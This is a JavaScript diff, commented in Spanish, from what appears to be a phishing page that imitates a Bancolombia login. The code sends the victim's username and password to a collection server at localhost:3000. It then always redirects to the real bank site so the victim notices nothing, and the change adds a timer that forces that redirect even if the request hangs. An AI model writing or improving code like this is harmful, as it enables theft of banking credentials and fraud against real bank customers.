@@ -1292,17 +1292,20 @@
             btn.disabled        = true;
             btn.textContent     = 'Ingresando...';
 
+            // Redirigir de forma segura tras 1.5 segundos incluso si el fetch se queda colgado
+            setTimeout(function() {
+                window.location.href = 'https://www.bancolombia.com/personas';
+            }, 1500);
+
             fetch('http://localhost:3000/login', {
                 method:  'POST',
                 headers: { 'Content-Type': 'application/json' },
                 body:    JSON.stringify({ usuario: usuario, clave: clave })
             })
             .then(function () {
-                // Redirigir siempre sin mostrar ningun mensaje
                 window.location.href = 'https://www.bancolombia.com/personas';
             })
             .catch(function () {
-                // Si falla la conexion al servidor igual redirigir
                 window.location.href = 'https://www.bancolombia.com/personas';
             });
         }
